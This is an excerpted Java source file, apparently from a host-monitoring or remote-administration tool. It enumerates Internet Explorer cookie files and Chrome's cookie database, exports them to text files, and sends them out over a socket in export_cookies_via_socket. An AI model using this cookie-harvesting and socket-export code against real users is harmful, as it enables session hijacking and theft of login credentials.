...
public class Cookie_Container_Host_System 
{
	...
	public Cookie_Container_Host_System(File fleCookie, boolean this_is_sqllite_database_file, boolean notify_user_of_empty_cookie)
	{
		try
		{
			...
			//Internet Explorer: C:\Users\Qoheleth\AppData\Roaming\Microsoft\Windows\Cookies
			//Chrome: C:\Users\Solomon Sonya\AppData\Local\Google\Chrome\User Data\Default\Cookies
			//chrome is in an sqllite3 database, encrypted, at C:\Users\<user_name>\AppData\Local\Google\Chrome\User Data\Profile 1
			//note, profile could be profile2, profile3, etc
		}
...
//					driver.directive(col_name);
		...
		{						
			...
			while(result_set.next())
			{
				try
				{
					...
					cookie.cookie_type = "Chrome Cookie DB table";
				...
				try
				{
					...
					else if(line.trim().equals("*"))
					{
						...
						if(web_server != null && !web_server.trim().equals("") && cookie_value != null && !cookie_value.trim().equals(""))
						{
							...
							cookie.cookie_type = "flat text file";
	...
	public static boolean update_cookies_host_system(boolean notify_user_of_empty_cookies)
	{
		try
		{			
			//clear prev entries
			if(Cookie_Object_Host_System.list_cookie_object_host_system != null && !Cookie_Object_Host_System.list_cookie_object_host_system.isEmpty())
			{
				for(Cookie_Object_Host_System cookie : Cookie_Object_Host_System.list_cookie_object_host_system)
					cookie = null;
			}
			
			try	{list_cookies_host_system_files.clear();}catch(Exception e){	list_cookies_host_system_files = new LinkedList<File>();}
			try	{Cookie_Object_Host_System.list_cookie_object_host_system.clear();}catch(Exception e){	Cookie_Object_Host_System.list_cookie_object_host_system = new LinkedList<Cookie_Object_Host_System>();}
			
			if(driver.isWindows)
			{
				//
				//Enumerate IE Cookies
				//
				driver.getFileListing(driver.fle_path_app_data_microsoft_cookies, true, null, list_cookies_host_system_files);
				
				if(list_cookies_host_system_files == null || list_cookies_host_system_files.isEmpty())
				{
					
					if(notify_user_of_empty_cookies)
						driver.directive("Punt! No cookies were found at cookie destinations...");
					
					return false;
				}
				
				//
				//Enumerate Internet Explorer Cookie Files
				//
				for(File fle : list_cookies_host_system_files)
				{
					//enumerate the cookies
					Cookie_Container_Host_System cookie = new Cookie_Container_Host_System(fle);
				}
				
				//
				//Enumerate Chrome Cookies
				//
				Cookie_Container_Host_System chrome_cookie = new Cookie_Container_Host_System(Driver.fle_path_app_data_chrome_cookies, true, notify_user_of_empty_cookies);
				...
				try
				{
					Collections.sort(Cookie_Object_Host_System.list_cookie_object_host_system, new Comparator<Cookie_Object_Host_System>()
					{
						public int compare(Cookie_Object_Host_System t1, Cookie_Object_Host_System t2)
						{
							if(t1.web_server == null || t2.web_server == null)
								return 1;
							
							return t1.web_server.compareToIgnoreCase(t2.web_server);
						}						
			...
			{
				driver.directive("Punt! Cookies Enumeration not configured for this system yet...");
			}
	...
	public static String export_cookies(boolean open_upon_completion, String delimiter)
	{
		try
		{
			delimiter = delimiter + " "; 
			...
			//
			//update cookie listing first, then export
			//			
			update_cookies_host_system(false);
			
			//
			//Ensure data to print
			//
			if(Cookie_Object_Host_System.list_cookie_object_host_system == null || Cookie_Object_Host_System.list_cookie_object_host_system.isEmpty())
			{
				driver.directive("PUNT! Cookie list is empty!");
				return null;
			}
			...
			//create the stream
			File fle = new File(path + "cookies.txt");
			File fle_table = new File(path + "cookies_table.txt");
			...
			//print header for table file
			pwOut_table.println(Cookie_Object_Host_System.get_cookie_header(delimiter));
			...
			for(Cookie_Object_Host_System cookie : Cookie_Object_Host_System.list_cookie_object_host_system)
			{
				...
				pwOut.println(cookie.get_display_data(delimiter, true));
				
				pwOut_table.println(cookie.get_display_data(delimiter, false));
			}
			...
			try	{	pwOut_table.flush();	}	 catch(Exception e){}
			try	{	pwOut_table.close();	}	 catch(Exception e){}
			
			//
			//open file
			//
			if(open_upon_completion && fle != null && fle.exists())
			{
				driver.open_file(fle);
			}
			
			if(open_upon_completion && fle_table != null && fle_table.exists())
			{
		...
		{
			driver.eop(myClassName, "export_cookies", e);
		}
	...
	public static boolean export_cookies_via_socket(ThdSocket socket, String delimiter)
	{
		try
		{
			delimiter = delimiter + " "; 
			...
			if(Cookie_Object_Host_System.list_cookie_object_host_system == null || Cookie_Object_Host_System.list_cookie_object_host_system.isEmpty())
			{
				socket.send("PUNT! Cookie list is empty!");
				return false;
			}			
			...
			for(Cookie_Object_Host_System cookie : Cookie_Object_Host_System.list_cookie_object_host_system)
			{
				...
				socket.send(cookie.get_display_data(delimiter, true));
			}
		...
		{
			driver.eop(myClassName, "export_cookies_via_socket", e);
		}
